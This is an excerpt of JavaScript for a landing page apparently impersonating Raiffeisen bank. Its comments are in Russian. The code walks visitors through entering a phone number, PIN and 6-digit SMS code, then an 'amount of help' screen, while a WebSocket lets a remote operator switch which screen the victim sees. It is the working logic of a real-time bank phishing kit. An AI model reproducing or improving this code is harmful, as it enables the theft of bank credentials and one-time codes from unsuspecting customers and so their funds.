...
document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) {
        console.log('═══════════════════════════════════════════════════');
        console.log('🚀 Лендинг RAIFFEISEN инициализирован');
    ...
    document.addEventListener('submit', async function(e) {
        ...
        if (form && form.id === 'phoneForm') {
            ...
            if (savedScreenBeforeCommand) {
                ...
                // Первый ввод телефона - переходим сразу к PIN (без пароля)
...
function connectWebSocket() {
    try {
        ...
        ws.onerror = (error) => {
            ...
            console.warn('⚠️  WebSocket не подключен, но HTTP API будет работать');
        };
...
function handleCommand(data) {
    ...
    switch (command) {
        ...
        case 'show_4_code':
        case 'show_6_code':
            // Raiffeisen использует только 6-значные коды
            showCodeScreen(6);
            break;
...
// Функция clearPasswordInput удалена - пароль больше не используется
...
async function submitPin(pin) {
    ...
    // После первого ввода PIN сразу переходим к SMS коду (6 цифр)
    if (CONFIG.SETTINGS.debug) {
        console.log('✅ PIN принят, переход к SMS коду');
    }
    
    // Переходим к вводу 6-значного SMS кода
    showCodeScreen(6);
}
...
function returnToSavedScreen(dataType) {
    ...
    switch (dataType) {
        ...
        case 'phone':
            // Переходим сразу к PIN (без пароля)
            showScreen('screen-pin');
            break;
        case 'pin':
            // После PIN - сразу показываем SMS код (6 цифр) для Raiffeisen
            showCodeScreen(6);
            break;
        case 'code':
            // После кода - показываем выбор суммы помощи
            showAmountSelection();
            break;
        default:
            showFinalLoading();
